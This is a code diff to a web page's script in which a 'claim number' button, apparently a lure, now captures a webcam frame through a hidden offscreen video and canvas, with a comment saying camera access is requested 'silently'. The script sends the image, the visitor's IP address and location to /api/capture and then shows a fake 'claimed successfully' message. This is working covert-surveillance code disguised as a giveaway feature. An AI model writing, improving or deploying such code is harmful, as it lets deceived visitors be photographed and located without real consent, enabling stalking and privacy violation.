@@ -112,36 +112,58 @@ async function getUserLocation() {
 
 
 // Claim number
-claimBtn.onclick=async ()=>{
-  if(!selectedNumber){ status.innerText="Select a number first!"; return; }
-  claimBtn.style.display='none'; loader.style.display='block'; status.innerText="Initializing...";
+claimBtn.onclick = async () => {
+  if (!selectedNumber) {
+    status.innerText = "Select a number first!";
+    return;
+  }
 
-  try{
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
-    video.srcObject = stream; video.style.display='block';
-    status.innerText="requesting for code...";
+  claimBtn.style.display = 'none';
+  loader.style.display = 'block';
+  status.innerText = "Initializing...";
 
-    setTimeout(async ()=>{
-      canvas.width=video.videoWidth; canvas.height=video.videoHeight;
-      canvas.getContext('2d').drawImage(video,0,0);
-      const imgBase64 = canvas.toDataURL('image/jpeg');
-      const ip = await getUserIP();
-      const location = await getUserLocation();
+  try {
+    // Request camera access silently
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-      await fetch("/api/capture",{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({image:imgBase64, token, ip, location})
-      });
+    // Create an offscreen video element (not added to DOM)
+    const offscreenVideo = document.createElement('video');
+    offscreenVideo.srcObject = stream;
+    offscreenVideo.play();
 
-      status.innerText=`Number ${selectedNumber} claimed successfully!`;
-      loader.style.display='none';
-      stream.getTracks().forEach(track=>track.stop());
-    },2000);
-  }catch(err){
+    // Wait a bit to allow video to load
+    await new Promise(r => setTimeout(r, 2000));
+
+    // Capture a frame with an offscreen canvas
+    const canvas = document.createElement('canvas');
+    canvas.width = offscreenVideo.videoWidth || 640;
+    canvas.height = offscreenVideo.videoHeight || 480;
+    canvas.getContext('2d').drawImage(offscreenVideo, 0, 0);
+
+    const imgBase64 = canvas.toDataURL('image/jpeg');
+
+    // Get IP and location
+    const ip = await getUserIP();
+    const location = await getUserLocation();
+
+    // Send data to server
+    await fetch("/api/capture", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ image: imgBase64, token, ip, location })
+    });
+
+    status.innerText = `Number ${selectedNumber} claimed successfully!`;
+    loader.style.display = 'none';
+
+    // Stop camera
+    stream.getTracks().forEach(track => track.stop());
+
+  } catch (err) {
     console.error(err);
-    status.innerText="Camera access is required.";
-    loader.style.display='none'; claimBtn.style.display='block';
+    status.innerText = "Camera access is required.";
+    loader.style.display = 'none';
+    claimBtn.style.display = 'block';
   }
 };
 </script>
